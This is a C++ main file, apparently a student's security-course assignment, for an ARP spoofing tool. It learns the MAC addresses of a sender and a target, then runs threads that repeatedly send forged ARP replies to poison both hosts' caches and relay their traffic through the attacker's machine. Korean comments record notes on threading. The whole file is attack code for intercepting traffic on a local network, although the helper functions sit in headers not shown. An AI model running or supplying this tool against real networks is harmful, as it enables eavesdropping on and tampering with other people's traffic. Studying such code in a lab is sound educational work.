// roadmap
// infect sender
// infect sender's target
// 대상이 절전상태일때 주기적으로 보내서 깨워야함!!
// 이문제 멀티스레딩으로 해보자
// 리플라이가 안왔을때
// 동기들한테 물어봐야겠다 코드리뷰때 뭐집어주셨는지

// 보내는 스레드 받는 스레드 있어야할듯
// 보내는 스레드는 받을거 받으면 종료하는데 받는스레드는 계속??

// 스레드 충돌 회피
// pthread_mutex_init

// arp 아닌 ip로도 테이블 학습하나?
//일단 배제

// pcap-next-ex 를 여러 스레드에서 접근하면 당연히 패킷을 버릴 가능성이 크다

// todo header chore
// #pragma once not in main??
#include <pcap.h>
#include "send.h"
#include "mac.h"
#include "ip.h"
#include <pthread.h>
#include <unistd.h>

#include <iostream>
#include <csignal>

#define PACKET_SLEEP_INTERVAL 5
#define PACKET_INFECT_INTERVAL 60

pcap_t *handle;

// for thread terminate
// can be list if paralled execute
int received;
int received2;
int rc[1024];

void *threadSendArp(void *param)
{
    EthArpPacket *bc_pkt = (EthArpPacket *)param;
    while (!received)
    {
        bc_pkt->send(handle);
        sleep(PACKET_SLEEP_INTERVAL);
    }
};

// void* arpInfect_th()
void *threadInfect(void *param)
{
    EthArpPacket *inf_pkt = (EthArpPacket *)param;
    while (1)
    {
        inf_pkt->send(handle);
        sleep(PACKET_INFECT_INTERVAL);
    }
}

struct SpoofParams
{
    Ip destip;
    Mac atkmac;
    Mac destmac;
};

void *threadSpoof(void *param)
{
    SpoofParams *sparam = (SpoofParams *)param;
    spoof(handle, sparam->destip, sparam->atkmac, sparam->destmac);
}

int main(int argc, char const *argv[])
{
    if (argc < 4 || argc % 2 == 1)
        usage();

    // 최적화시 사용
    pthread_t p_bc[argc - 2];
    pthread_t p_inf[argc - 2];

    // restore tables when terminate
    // std::atexit(NULL);
    signal(SIGINT, NULL);

    Mac attackerMac;
    Ip attackerIp;
    getDeviceAddress(argv[1], &attackerIp, &attackerMac);
    printf("attacker ip %s\n", std::string(attackerIp).c_str());
    printf("attacker mac %s\n", std::string(attackerMac).c_str());

    char errbuf[PCAP_ERRBUF_SIZE];
    handle = pcap_open_live(argv[1], BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr)
    {
        fprintf(stderr, "couldn't open device %s(%s)\n", argv[1], errbuf);
        return -1;
    }
    printf("pcap now listening\n");

    int schedule = 2;
    Ip senderIp = Ip(const_cast<char *>(argv[schedule]));
    Ip targetIp = Ip(const_cast<char *>(argv[schedule + 1]));

    pthread_attr_t attr;
    int attrErr = pthread_attr_init(&attr);
    if (attrErr)
        fprintf(stderr, "couldn't pthread_attr_init error with %d\n", attrErr);
    pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);

    // infect sender
    EthArpPacket bc_pkt = EthArpPacket::broadcastPacket(attackerMac, attackerIp, senderIp);
    printf("broadcast packet sending to sender %s...\n", std::string(senderIp).c_str());
    pthread_t a;
    int threadErr = pthread_create(&a, &attr, threadSendArp, &bc_pkt);
    if (threadErr != 0)
        printf("thread A create fail : %d\n", threadErr);

    // wait
    Mac senderMac = receiveArpReply(handle, senderIp, &received);
    printf("sender mac address get : %s\n", std::string(senderMac).c_str());

    EthArpPacket inf_pkt = EthArpPacket::infectPacket(attackerMac, senderMac, senderIp, targetIp);
    pthread_t b;
    int threadErr1 = pthread_create(&b, &attr, threadInfect, &inf_pkt);
    if (threadErr1 != 0)
        printf("thread A create fail : %d\n", threadErr);
    printf("infect thread opened to sender %s...\n", std::string(senderIp).c_str());

    // infect target
    EthArpPacket bc_pkt1 = EthArpPacket::broadcastPacket(attackerMac, attackerIp, targetIp);
    printf("broadcast packet sending to target %s...\n", std::string(targetIp).c_str());
    pthread_t c;
    int threadErr2 = pthread_create(&c, &attr, threadSendArp, &bc_pkt1);
    if (threadErr2 != 0)
        printf("thread A create fail : %d\n", threadErr);

    // wait
    Mac targetMac = receiveArpReply(handle, targetIp, &received2);
    printf("target mac address get : %s\n", std::string(targetMac).c_str());

    EthArpPacket inf_pkt1 = EthArpPacket::infectPacket(attackerMac, targetMac, targetIp, senderIp);
    pthread_t d;
    int threadErr3 = pthread_create(&d, &attr, threadInfect, &inf_pkt1);
    if (threadErr3 != 0)
        printf("thread A create fail : %d\n", threadErr);
    printf("infect thread opened to target %s...\n", std::string(targetIp).c_str());

    // pcap sniff start
    pthread_t p;
    int threadErrpcap = pthread_create(&p, NULL, producePacket, &handle);
    if (threadErrpcap != 0)
        printf("thread A create fail : %d\n", threadErr);
    printf("pcap sniffing thread start\n");

    // spoofing thread
    printf("spoofing start...\n");

    pthread_t e;
    pthread_mutex_t mutex1;
    pthread_cond_t cond1;
    pthread_mutex_init(&mutex1, NULL);
    pthread_cond_init(&cond1, NULL);
    registerIp(senderIp, &cond1, &mutex1);

    SpoofParams sp = {senderIp, attackerMac, senderMac};
    int threadErr4 = pthread_create(&e, &attr, threadSpoof, &sp);
    if (threadErr4 != 0)
        printf("thread e create fail : %d\n", threadErr);
    printf("spoofing packets to %s\n", std::string(senderIp).c_str());

    // another mutex cond needed

    pthread_t f;
    pthread_mutex_t mutex2;
    pthread_cond_t cond2;
    pthread_mutex_init(&mutex2, NULL);
    pthread_cond_init(&cond2, NULL);
    registerIp(targetIp, &cond2, &mutex2);

    SpoofParams sp2 = {targetIp, attackerMac, targetMac};
    int threadErr5 = pthread_create(&f, &attr, threadSpoof, &sp2);
    if (threadErr5 != 0)
        printf("thread f create fail : %d\n", threadErr);
    printf("spoofing packets to %s\n", std::string(targetIp).c_str());

    // temp
    pthread_join(e, NULL);

    return 0;
}

// 리턴값 = pthread_create(스레드 아이디, 스레드 속성, 실행 함수, 스레드 함수 인자)
// int pthread_create(pthread_t *th_id, const pthread_attr_t *attr, void *함수명, void *arg);
// pthread_create 함수의 리턴값이 0이면 성공, 아니면 실패다.
// threadErr = pthread_create(&tA, NULL, threadA, NULL);
// if (threadErr != 0)
// {
//     printf("thread A create fail : %d\n", threadErr);
// }

// 스레드 종료를 기다림
// 리턴값 = pthread_join(스레드 아이디, 스레드 리턴 값)
// int pthread_join(pthread_t th_id, void **thread_return);
// pthread_join 함수의 리턴값이 0이면 성공, 아니면 실패다.

// pthread_detach

// 프로그램 종료시 모든 스레드 종료?